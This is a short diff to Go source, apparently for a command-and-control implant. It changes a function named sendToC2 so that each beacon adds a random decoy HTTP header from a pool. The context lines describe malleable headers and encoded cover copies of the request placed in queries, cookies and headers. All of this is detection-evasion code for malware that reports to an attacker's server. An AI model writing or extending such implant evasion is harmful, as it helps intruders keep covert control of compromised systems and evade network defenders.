@@ -95,6 +95,12 @@ func sendToC2(idx int, body []byte) []byte {
 	for _, k := range sortedHeaderKeys(MalleableRequestHeaders) {
 		req.Header.Set(k, MalleableRequestHeaders[k])
 	}
+	// Per-beacon decoy header rotation (v2 request_header_pool): one random
+	// entry per beacon so identical envelopes still vary on the wire. Empty
+	// pool (or only functional entries) is a no-op.
+	if hk, hv, ok := randomPoolHeader(); ok {
+		req.Header.Set(hk, hv)
+	}
 	// v2 placements: encoded cover copies of the envelope at query / cookie /
 	// header locations. The canonical body is unchanged, so servers without
 	// placement config keep working.
